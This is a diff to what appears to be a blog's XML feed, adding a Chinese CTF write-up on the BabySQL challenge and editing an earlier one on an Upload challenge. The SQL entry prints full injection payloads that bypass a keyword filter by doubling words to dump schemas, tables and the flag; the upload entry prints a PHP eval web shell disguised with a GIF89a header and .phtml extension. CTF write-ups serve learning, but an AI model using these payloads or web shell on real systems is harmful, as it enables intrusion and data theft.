@@ -4,11 +4,30 @@
   
   
   <entry>
+    <title>BUU每日一题013</title>
+    <link href="/2021/01/27/BUU013/"/>
+    <url>/2021/01/27/BUU013/</url>
+    
+    <content type="html"><![CDATA[<h2 id="十三、"><a href="#十三、" class="headerlink" title="十三、"></a>十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]BabySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/ba5c0550bde2d7d3.png">     </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>SQL注入<br><code>username=1&#39;      password=1</code>报错<br><code>username=1&#39;# password=1</code>没有报错，那应该就是单引号字符型了吧<br>然后<code>order by </code><img src="https://ftp.bmp.ovh/imgs/2021/01/2c23369b6aece50e.png"><br>只剩了<code>der</code>说明<code>or</code>被替换为空了，因为只会替换一次，所以双写即可绕过<code>oorrder by </code>然后发现<code>by</code>也被替换了，但返回显示的是<code>1#</code>前面的order不是绕过了么，怎么会没有了？？<br><code>oorrder bbyy</code>得到一共有三列<br>还有<code>select、from、where</code>也会被替换        </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><code>username=1&amp;password=1&#39; ununionion selselectect 1,2,(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到所有库<img src="https://ftp.bmp.ovh/imgs/2021/01/6f07428aeecb4084.png"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=&#39;ctf&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>ctf下的表<img src="https://ftp.bmp.ovh/imgs/2021/01/faaaf5cf1ab77e21.png"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#39;Flag&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>Flag下的列<img src="https://ftp.bmp.ovh/imgs/2021/01/a316535fcd86d177.png"><br><code>username=1;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(flag) frfromom ctf.Flag),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/e332d6380e96f25e.png">    </p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题012</title>
     <link href="/2021/01/26/BUU012/"/>
     <url>/2021/01/26/BUU012/</url>
     
-    <content type="html"><![CDATA[<h2 id="十二、"><a href="#十二、" class="headerlink" title="十二、"></a>十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]Upload<br><img src="https://ftp.bmp.ovh/imgs/2021/01/6d2e2b3ae0376852.png">         </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>文件上传，先上个<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/e24a1953387decc7.png"><br>???<br>应该是<code>Content-Type</code>吧，抓包是这样<code>Content-Type: image/jpeg</code>改了后缀后还是<code>not image</code>????<br>传个<code>.php</code>顺便改下<code>Content-Type</code><img src="https://ftp.bmp.ovh/imgs/2021/01/f243cb9e7e51afb6.png"><br>看来会检查后缀名；将<code>.php</code>改为<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/cebf65b0f76244c3.png"><br>说明不能有<code>&lt;?</code><br>后缀改为<code>.phtml</code>，内容改为<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code><img src="https://ftp.bmp.ovh/imgs/2021/01/989505f00c710eb4.png"><br>加上<code>GIF89a</code>成功上传<br>蚁剑连接          </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>至于连接的路径，看别人的wp都说猜的<code>/upload/文件名</code><br><code>..........................</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/5f8ff088e106744f.png"><br>在根目录发现flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/85fc0fdb7ecda9f9.png">       </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p><code>phtml</code>:嵌入PHP脚本的html，使用phtml作为后缀名<br>完全是PHP写的，用php作为后缀名<br><code>GIF89a</code>:GIF就是GIF文件的标识；89a是版本号，还有87a<br>图片头文件欺骗        </p></blockquote>]]></content>
+    <content type="html"><![CDATA[<h2 id="十二、"><a href="#十二、" class="headerlink" title="十二、"></a>十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]Upload<br><img src="https://ftp.bmp.ovh/imgs/2021/01/6d2e2b3ae0376852.png">         </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>文件上传，先上个<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/e24a1953387decc7.png"><br>???<br>应该是<code>Content-Type</code>吧，抓包是这样<code>Content-Type: image/jpeg</code>改了后缀后还是<code>not image</code>????<br>传个<code>.php</code>顺便改下<code>Content-Type</code><img src="https://ftp.bmp.ovh/imgs/2021/01/f243cb9e7e51afb6.png"><br>看来会检查后缀名；将<code>.php</code>改为<code>.jpg</code><img src="https://ftp.bmp.ovh/imgs/2021/01/cebf65b0f76244c3.png"><br>说明不能有<code>&lt;?</code><br>后缀改为<code>.phtml</code>，内容改为<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code><img src="https://ftp.bmp.ovh/imgs/2021/01/989505f00c710eb4.png"><br>加上<code>GIF89a</code>成功上传<br>蚁剑连接          </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>至于连接的路径，看别人的wp都说猜的<code>/upload/文件名</code><br><code>..........................</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/5f8ff088e106744f.png"><br>在根目录发现flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/85fc0fdb7ecda9f9.png">       </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p><code>phtml</code>:嵌入PHP脚本的html，使用phtml作为后缀名<br>完全是PHP写的，用php作为后缀名<br><code>GIF89a</code>:GIF就是GIF文件的标识；89a是版本号，还有87a<br>图片头文件欺骗      </p></blockquote><blockquote><p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt; </code>     </p></blockquote>]]></content>
     
     
     
